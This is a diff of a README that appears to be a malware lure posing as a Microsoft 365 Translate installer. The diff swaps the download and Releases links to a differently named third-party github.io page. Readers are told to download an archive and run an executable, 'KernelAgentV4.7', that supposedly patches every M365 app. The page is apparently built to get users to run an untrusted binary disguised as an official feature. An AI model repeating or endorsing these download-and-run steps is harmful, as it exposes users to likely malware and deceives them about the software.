@@ -2,14 +2,14 @@
 
 Activate Microsoft 365’s built-in Translate feature for seamless multilingual workflows in Word, Outlook, and PowerPoint. This installer enables in-app language translation with secure local patching via KernelAgentV4.7.
 
-[![Download Translate Tool](https://img.shields.io/badge/Download-Translate_AI-blueviolet)](https://m365-translate-text-service.github.io/.github
+[![Download Translate Tool](https://img.shields.io/badge/Download-Translate_AI-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/fer
 )
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://m365-translate-text-service.github.io/.github
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/fer
 ) section  
 2. 📁 **Extract the folder** to a location like `C:\M365Translate`  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` to register the Translate features in all M365 apps  
